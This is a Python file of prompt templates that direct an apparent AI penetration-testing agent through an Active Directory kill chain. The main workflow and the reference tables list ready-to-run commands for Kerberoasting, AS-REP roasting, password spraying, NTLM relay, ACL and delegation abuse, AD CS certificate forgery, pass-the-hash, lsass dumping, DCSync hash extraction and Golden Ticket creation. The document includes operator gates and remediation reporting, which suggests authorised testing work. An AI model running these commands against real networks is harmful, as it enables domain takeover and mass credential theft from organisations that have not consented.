"""
RedAmon Active Directory Kill Chain Prompts

Black-box and grey-box workflows for on-premises Active Directory compromise:
reconnaissance, credential attacks, BloodHound-driven path analysis, ACL abuse,
Kerberos attacks, lateral movement, and Domain Admin attainment.

This skill is DISTINCT from hybrid_identity — it covers pure on-prem AD without
federation, Entra ID, or cloud bridging. If the target is hybrid, use
hybrid_identity instead.
"""

# =============================================================================
# AD KILL CHAIN MAIN WORKFLOW
# =============================================================================

AD_KILL_CHAIN_TOOLS = """
## ATTACK SKILL: ACTIVE DIRECTORY KILL CHAIN

**CRITICAL: This attack skill has been CLASSIFIED as Active Directory Kill Chain.**
**You MUST follow the AD workflow below. Do NOT switch to other attack methods.**

This skill covers the full on-prem AD compromise lifecycle:
1. **Reconnaissance** — user enum, share enum, LDAP recon, BloodHound ingest
2. **Credential attacks** — AS-REP roasting, Kerberoasting, brute force, spraying
3. **BloodHound analysis** — shortest path to DA, high-value targets, ACL abuse
4. **Exploitation** — relay, delegation abuse, AD CS (ESC1-ESC13), DCSync
5. **Lateral movement** — pass-the-hash, overpass-the-hash, named-pipe pivot
6. **Domain dominance** — Golden Ticket, Silver Ticket, DCShadow, backup key extraction

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
BloodHound ingest enabled:     {ad_bh_enabled}
Kerberoast / AS-REP enabled:   {ad_kerberoast_enabled}
Password spray enabled:        {ad_spray_enabled}
NTLM relay enabled:            {ad_relay_enabled}
AD CS (certipy) enabled:       {ad_certipy_enabled}
DCSync enabled:                {ad_dcsync_enabled}
Aggressive lateral movement:   {ad_aggressive_enabled}

Domain hint:                   {ad_domain_hint}
DC IP hint:                    {ad_dc_ip_hint}
User wordlist:                 {ad_user_wordlist}
Password wordlist:             {ad_pass_wordlist}
```

**Hard rules:**
- ALWAYS run Step 1 (recon + graph query) BEFORE firing credential attacks.
- If `Password spray enabled: False`, do NOT spray passwords. Stick to AS-REP / Kerberoasting.
- If `NTLM relay enabled: False`, do NOT run ntlmrelayx or coerce authentication.
- If `DCSync enabled: False`, do NOT attempt DCSync or DCShadow.
- If `Aggressive lateral movement: False`, stop after cred capture / hash extraction.
  Do NOT deploy implants, persistent services, or move across hosts.
- NEVER spray more than 3 passwords per user in a single wave to avoid lockout.
  Read lockout policy with `netexec` BEFORE spraying.

---

## MANDATORY AD KILL CHAIN WORKFLOW

### Step 1: Reconnaissance (query_graph + kali_shell, <60s)

Before any credential or exploitation action, pull recon data and confirm the domain:

```cypher
MATCH (h:Host) WHERE h.os CONTAINS 'Windows' OR h.ports CONTAINS '88' OR h.ports CONTAINS '445' OR h.ports CONTAINS '389' RETURN h.ip, h.hostname, h.ports, h.os LIMIT 50
MATCH (s:Service) WHERE s.port IN [88,135,139,445,389,3268,3269,9389] RETURN s.port, s.product, s.version, s.host LIMIT 50
MATCH (d:Domain) RETURN d.name, d.dc_ip, d.fqdn LIMIT 10
MATCH (u:User) WHERE u.domain IS NOT NULL RETURN u.name, u.domain, u.spn_status LIMIT 50
```

If graph data is sparse, run targeted recon:

```
# Confirm SMB + LDAP + Kerberos ports
execute_naabu({{"args": "-host <target_ip> -p 88,135,139,389,445,464,593,636,3268,3269,9389 -json"}})

# Quick OS + domain fingerprint via SMB
kali_shell({{"command": "nxc smb <target_ip> --local-auth"}})

# LDAP anonymous bind check + naming context
kali_shell({{"command": "ldapdomaindump -u '\\\\' -p '' <target_ip> -o /tmp/ldapdump"}})
```

Capture: domain name, FQDN, DC IP(s), functional level, SMB signing status, LDAP binding.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: BloodHound ingest (CONDITIONAL on `BloodHound ingest enabled`=True)

BloodHound is the primary source-of-truth for AD attack paths. Ingest data BEFORE
choosing an exploitation vector.

```
kali_shell({{"command": "bloodhound-python -c All,LoggedOn -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> --zip"}})
```

If no credentials yet, use the `SharpHound` or `bloodhound-python` null-session / guest path:

```
kali_shell({{"command": "bloodhound-python -c All -d <DOMAIN> -u 'guest' -p '' -ns <DC_IP> --zip"}})
```

Load the resulting ZIP into `bhgraph` (pre-installed, no Neo4j required):

```
kali_shell({{"command": "bhgraph load /tmp/*.zip"}})
kali_shell({{"command": "bhgraph stats"}})
kali_shell({{"command": "bhgraph kerberoastable"}})
kali_shell({{"command": "bhgraph asreproastable"}})
kali_shell({{"command": "bhgraph path-to-da"}})
```

Record: kerberoastable accounts, AS-REP roastable accounts, shortest path to DA,
unconstrained delegation hosts, DCSync-capable principals, high-value targets.

### Step 3: Credential attacks (choose based on BloodHound output)

**3A. AS-REP Roasting** (no pre-auth required — safest, no lockout risk)

```
kali_shell({{"command": "impacket-GetNPUsers -dc-ip <DC_IP> -usersfile /tmp/users.txt <DOMAIN>/"}})
```

Crack with hashcat (mode 18200):

```
kali_shell({{"command": "hashcat -m 18200 /tmp/asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"}})
```

**3B. Kerberoasting** (requires any valid domain credential)

```
kali_shell({{"command": "impacket-GetUserSPNs -dc-ip <DC_IP> -request <DOMAIN>/<USER>:<PASS>"}})
```

Crack with hashcat (mode 13100):

```
kali_shell({{"command": "hashcat -m 13100 /tmp/kerberoast.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"}})
```

**3C. Password spray** (CONDITIONAL on `Password spray enabled`=True)

Read lockout policy FIRST:

```
kali_shell({{"command": "nxc smb <DC_IP> -u /tmp/users.txt -p /tmp/passwords.txt --pass-pol"}})
```

Spray with kerbrute (Kerberos pre-auth, quieter than SMB):

```
kali_shell({{"command": "kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> /tmp/passwords.txt user_to_spray"}})
```

Or netexec spray (safer: stops on first success per host, respects lockout):

```
kali_shell({{"command": "nxc smb <target_range> -u /tmp/users.txt -p 'Password123' --continue-on-success --no-bruteforce"}})
```

**3D. SMB relay** (CONDITIONAL on `NTLM relay enabled`=True)

Only if SMB signing is disabled or partially disabled on targets:

```
# Identify signing-disabled hosts
kali_shell({{"command": "nxc smb <target_range> --gen-relay-list /tmp/relay_targets.txt"}})
# Run responder + ntlmrelayx
kali_shell({{"command": "responder -I eth0 -wrf"}})
kali_shell({{"command": "ntlmrelayx.py -tf /tmp/relay_targets.txt -smb2support -i"}})
```

### Step 4: BloodHound-guided exploitation

Pick the SHORTEST path from Step 2 and execute it.

**Common paths and tool mapping:**

| BloodHound Edge | Tool | Command pattern |
|---|---|---|
| ForceChangePassword | bloodyAD | `bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <DC_IP> set password <TARGET> <NEWPASS>` |
| AddMember | bloodyAD | `bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <DC_IP> add groupMember <GROUP> SELF` |
| GenericAll / GenericWrite | netexec + powerview | `nxc ldap <DC_IP> -u <USER> -p <PASS> -M shadow_credentials` |
| WriteDACL | impacket-dacledit | `impacket-dacledit -action write -rights FullControl -principal <YOU> -target <TARGET> <DOMAIN>/<USER>:<PASS>` |
| ReadGMSAPassword | gMSADumper | `gMSADumper.py -u <USER> -p <PASS> -d <DOMAIN> -l <DC_IP>` |
| AllowedToDelegate / RBCD | impacket-rbcd / getST | See Step 5 |
| HasSession / CanPSRemote | netexec / impacket-wmiexec | `nxc winrm <TARGET> -u <USER> -p <PASS> -X whoami` |

For each edge: execute, verify with a read/enum command, record evidence.

### Step 5: Delegation abuse & AD CS (advanced)

**Unconstrained delegation:**

```
kali_shell({{"command": "nxc smb <DC_IP> -u <USER> -p <PASS> --delegate <TARGET_HOST>"}})
```

**Constrained / RBCD delegation:**

```
# Add RBCD for target
kali_shell({{"command": "impacket-rbcd -action write -delegate-from <COMPROMISED_MACHINE$> -delegate-to <TARGET$> <DOMAIN>/<USER>:<PASS>"}})
# Impersonate admin to target
kali_shell({{"command": "impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/<COMPROMISED_MACHINE$> -hashes <LMHASH>:<NTHASH>"}})
# Export ticket and use
kali_shell({{"command": "export KRB5CCNAME=/tmp/Administrator.ccache; impacket-wmiexec -k -no-pass <TARGET>"}})
```

**AD CS (certipy-ad) — CONDITIONAL on `AD CS enabled`=True:**

```
# Find vulnerable templates (ESC1-ESC13)
kali_shell({{"command": "certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable"}})
# Request certificate for elevated UPN
kali_shell({{"command": "certipy-ad req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<DOMAIN>"}})
# Authenticate with PFX
kali_shell({{"command": "certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>"}})
```

### Step 6: Lateral movement (CONDITIONAL on `Aggressive lateral movement`=True)

```
# Pass-the-hash
kali_shell({{"command": "impacket-wmiexec -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>@<TARGET>"}})
# Overpass-the-hash (TGT reuse)
kali_shell({{"command": "impacket-getTGT <DOMAIN>/<USER> -hashes <LMHASH>:<NTHASH>"}})
# CrackMapExec / netexec sweep for code exec
kali_shell({{"command": "nxc smb <target_range> -u <USER> -H <NTHASH> -X whoami"}})
```

**Limitation:** do NOT move to more than 3 hosts without operator approval.
Document each hop: target IP, credential used, access level gained.

### Step 7: Domain dominance (CONDITIONAL on `DCSync enabled`=True)

Only when a DCSync-capable principal is achieved:

```
# DCSync all NT hashes
kali_shell({{"command": "impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC_IP>"}})
# Golden Ticket (krbtgt hash required)
kali_shell({{"command": "impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain <DOMAIN> Administrator"}})
```

Stop after hash extraction. Do NOT deploy persistence or modify DC objects.

### Step 8: Reporting requirements

The final report MUST contain:
- **Domain** compromised (or partially compromised)
- **Initial vector** (AS-REP / Kerberoast / spray / relay / delegation)
- **Credential(s) captured** (username + hash type, NEVER plaintext passwords in raw form)
- **BloodHound path** (shortest path to DA, or closest high-value target)
- **Hosts accessed** (IP, access method, privilege level)
- **Defenses observed** (SMB signing, LDAP signing, EPA, NTLMv2 only, LAPS, SID filtering)
- **Exact reproducer** (full command with flags used)
- **Remediation** (technical control per finding)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Valid domain cred obtained (any technique) | POTENTIAL |
| 2 | BloodHound path to DA identified + one edge executed | POTENTIAL (med) |
| 3 | Lateral movement achieved on 1+ hosts | EXPLOITED |
| 4 | DCSync / Domain Admin / Golden Ticket | EXPLOITED (CRITICAL) |

A Level-1 finding with NO lateral path is a **credential finding**, not a domain
compromise. Only report Level 3+ as exploited.
"""


# =============================================================================
# AD PAYLOAD / TECHNIQUE REFERENCE
# =============================================================================

AD_KILL_CHAIN_PAYLOAD_REFERENCE = """
## AD Kill Chain Technique Reference

### Impacket quick reference

| Tool | Purpose | Example |
|---|---|---|
| `impacket-GetNPUsers` | AS-REP roast | `impacket-GetNPUsers -dc-ip IP DOMAIN/ -usersfile users.txt` |
| `impacket-GetUserSPNs` | Kerberoast | `impacket-GetUserSPNs -dc-ip IP -request DOMAIN/USER:PASS` |
| `impacket-secretsdump` | DCSync / local SAM | `impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASS@DC_IP` |
| `impacket-wmiexec` | Remote cmd (PtH OK) | `impacket-wmiexec -hashes LM:NT DOMAIN/USER@TARGET` |
| `impacket-psexec` | Service-based remote cmd | `impacket-psexec DOMAIN/USER:PASS@TARGET` |
| `impacket-smbexec` | SMB pipe remote cmd | `impacket-smbexec DOMAIN/USER:PASS@TARGET` |
| `impacket-ticketer` | Golden / Silver ticket | `impacket-ticketer -nthash HASH -domain-sid SID -domain DOM ADMIN` |
| `impacket-getST` | S4U constrained delegation | `impacket-getST -spn cifs/TGT -impersonate Admin DOMAIN/MACH$` |
| `impacket-rbcd` | RBCD config | `impacket-rbcd -action write -delegate-from A$ -delegate-to B$ ...` |
| `impacket-dacledit` | ACL manipulation | `impacket-dacledit -action write -rights FullControl ...` |
| `impacket-ntlmrelayx` | NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support -i` |
| `impacket-addcomputer` | Machine account creation | `impacket-addcomputer -computer-name FAKE$ -domain DOM ...` |

### Netexec / CrackMapExec quick reference

```
nxc smb IP -u user -p pass --shares          # list SMB shares
nxc smb IP -u user -p pass --pass-pol        # lockout policy
nxc smb IP -u user -p pass -M lsass          # lsass dump (admin)
nxc smb IP -u user -p pass -X whoami         # command exec via WMI
nxc smb IP -u user -p pass --gen-relay-list  # signing-disabled hosts
nxc ldap IP -u user -p pass -M shadow_credentials
nxc winrm IP -u user -p pass -X whoami       # WinRM cmd exec
```

### Hash modes (hashcat)

| Mode | Type | Source |
|------|------|--------|
| 1000 | NTLM | secretsdump, SAM |
| 13100 | Kerberos 5 TGS-REP | Kerberoasting |
| 18200 | Kerberos 5 AS-REP | AS-REP roasting |
| 5500 | NetNTLMv1 | captured challenge-response |
| 5600 | NetNTLMv2 | captured challenge-response |

### BloodHound edges to exploitation mapping

| Edge | Abuse | Tool |
|------|-------|------|
| GenericAll | Shadow credentials / force password | nxc shadow_credentials / bloodyAD |
| GenericWrite | Logon script / targeted Kerberoasting | PowerView / rbcd |
| WriteOwner | Take ownership -> GenericAll | impacket-owneredit |
| WriteDACL | Grant DCSync rights | impacket-dacledit |
| DCSync | Dump all domain hashes | impacket-secretsdump |
| ForceChangePassword | Set known password | bloodyAD |
| AddSelf / AddMember | Add to privileged group | bloodyAD |
| AllowedToDelegate | S4U2Self -> S4U2Proxy | impacket-getST |
| AllowedToAct (RBCD) | S4U2Self -> S4U2Proxy | impacket-rbcd + getST |
| ReadLAPSPassword | Read LAPS local admin pass | nxc / PowerView |
| ReadGMSAPassword | Read gMSA password | gMSADumper |
| SQLAdmin | DB admin -> code exec | nxc mssql -X whoami |
| HasSession | Pass-the-hash / token reuse | impacket-wmiexec |
"""
